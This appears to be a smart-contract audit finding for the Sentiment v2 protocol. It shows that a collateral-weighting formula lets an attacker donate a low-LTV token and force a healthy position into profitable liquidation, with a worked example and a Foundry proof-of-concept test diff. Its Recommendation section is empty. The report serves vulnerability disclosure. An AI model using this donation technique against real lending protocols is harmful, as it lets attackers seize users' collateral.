Flat Tawny Haddock

High

# Formula used for minimum required collateral value is flawed

## Summary
The formula that is used to calculate the minimum required collateral value for a position is flawed and allows attackers to liquidate user's by donating assets

## Vulnerability Detail
A position is considered non-healthy ie. liquidateable when the collateral value is less than `minReqAssetValue`

[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L67-L85)
```solidity
    function isPositionHealthy(address position) public view returns (bool) {
        
        ....

        uint256 minReqAssetValue =
            _getMinReqAssetValue(debtPools, debtValueForPool, positionAssets, positionAssetWeight, position);
        return totalAssetValue >= minReqAssetValue; // (non-zero debt, non-zero assets)
    }
```

Where `minReqAssetValue` is calculated as follows:
[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L272)
```solidity
    function _getMinReqAssetValue(
        uint256[] memory debtPools,
        uint256[] memory debtValuleForPool,
        address[] memory positionAssets,
        uint256[] memory wt,
        address position
    ) internal view returns (uint256) {
        
        ....

        for (uint256 i; i < debtPoolsLength; ++i) {
            for (uint256 j; j < positionAssetsLength; ++j) {
                
                ....

                minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up);
            }
        }
```

Here `wt[j]` is the weight of the collateral token by value ie. if in a pool there is 1 worth of collateral A and 1 worth of collateral B, then both have weights as 0.5,0.5. `ltv` is the loan to value ratio. 

This method of calculation of `minReqAssetValue` is flawed as it can allow an attacker to donate and increase balance of the lower ltv token causing higher portion of the debt to be assigned to the lower ltv token which can increase the minReqAssetValue in a way such that it is not covered by the donated amount

Eg:
all tokens prices = 1
ltv a = 20%, ltv b = 80%
initial collateral amounts: 40a, 160b (2:8)
debt amount = 100
currently healthy position,
minReqAssetValue = (100 * 0.2 / 0.2) + (100 * 0.8 / 0.8) == 200 == collateral value

attacker donates 1 token a
now token weights = 41:160
now minReqAssetValue = (100 * (41/201) / 0.2 ) + (100 * (160/201) / 0.8) == 201.492537313 while collateral value == 200 + 1 == 201

hence liquidateable

attacker can now liquidate the position making a profit with the 10% liquidation discount

### POC Code
Apply the following diff and run `testHash_LiquidatePositionByDonation`. It is asserted that a pool that was healthy can be made liquidateable by an attacker by making a donation which will be covered by their profit

```diff
diff --git a/protocol-v2/test/integration/LiquidationTest.t.sol b/protocol-v2/test/integration/LiquidationTest.t.sol
index beaca63..4dcd863 100644
--- a/protocol-v2/test/integration/LiquidationTest.t.sol
+++ b/protocol-v2/test/integration/LiquidationTest.t.sol
@@ -33,9 +33,9 @@ contract LiquidationTest is BaseTest {
         vm.stopPrank();
 
         vm.startPrank(poolOwner);
-        riskEngine.requestLtvUpdate(fixedRatePool, address(asset3), 0.5e18); // 2x lev
+        riskEngine.requestLtvUpdate(fixedRatePool, address(asset3), 0.8e18); // 2x lev
         riskEngine.acceptLtvUpdate(fixedRatePool, address(asset3));
-        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.5e18); // 2x lev
+        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.2e18); // 2x lev
         riskEngine.acceptLtvUpdate(fixedRatePool, address(asset2));
         vm.stopPrank();
 
@@ -48,6 +48,43 @@ contract LiquidationTest is BaseTest {
         vm.stopPrank();
     }
 
+    function testHash_LiquidatePositionByDonation() public {
+        // asset 1,2,3 price = 1 and asset 2 ltv = 0.2 and asset 3 ltv = 0.8
+        // borrow 100 debt and put asset2:asset3 collateral value in 2:8
+        // setup tokens
+        {
+            uint256 asset2CollateralAmount = 40e18;
+            uint256 asset3CollateralAmount = 160e18;
+            asset2.mint(user, asset2CollateralAmount);
+            asset3.mint(user, asset3CollateralAmount);
+            vm.startPrank(user);
+            asset2.approve(address(positionManager), asset2CollateralAmount);
+            asset3.approve(address(positionManager), asset3CollateralAmount);
+
+            Action[] memory actions = new Action[](6);
+            (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
+            actions[1] = deposit(address(asset2), asset2CollateralAmount);
+            actions[2] = deposit(address(asset3), asset3CollateralAmount);
+            actions[3] = addToken(address(asset2));
+            actions[4] = addToken(address(asset3));
+            actions[5] = borrow(fixedRatePool, 100e18);
+            positionManager.processBatch(position, actions);
+            vm.stopPrank();
+        }
+
+        assertTrue(riskEngine.isPositionHealthy(position));
+
+        //attacker deposits 1 more asset2, makes the position liquidateable and liquidates the position
+        address attacker = address(0xd33d33);
+        asset2.mint(attacker,1e18);
+
+        vm.prank(attacker);
+        asset2.transfer(position,1e18);
+        assertTrue(!riskEngine.isPositionHealthy(position));
+
+        // attacker can liquidate 100e18 debt for a liquidation profit of 10% making a net profit
+    }
+
     function testLiquidate() public {
         vm.startPrank(user);
         asset2.approve(address(positionManager), 1e18);

```

## Impact
User's can be liquidated by attackers even when they have maintained enough collateral value

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L272

## Tool used
Manual Review

## Recommendation 